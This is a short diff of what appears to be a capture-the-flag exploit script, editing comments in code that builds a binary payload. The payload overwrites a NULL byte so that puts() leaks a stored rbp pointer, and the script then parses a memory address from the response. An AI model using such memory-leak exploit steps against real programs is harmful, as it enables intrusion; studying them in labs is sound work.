@@ -32,7 +32,7 @@ if __name__ == "__main__":
     payload = ""
     payload += p64(9)
     payload += p64(0xcafebabedeadbeef) 
-    payload += "A" # overwrite NULL (unless puts() would terminate before the stored rbp)
+    payload += "A" # overwrite NULL (unless puts() will terminate before the stored rbp)
 
     r.send(payload)
     resp = r.recv()
@@ -44,7 +44,7 @@ if __name__ == "__main__":
 # 0xcafebabedeadbeef + 'A' + 
 # ef:be:ad:de:be:ba:fe:ca:41: a0:ad:0f:93:7f: 0a
 
-# leak rbp which points the start of mmap'ed memory 
+# leak rbp
 
     mmap = resp[9:14]
     mmap = "\x00" + mmap + "\x00\x00"
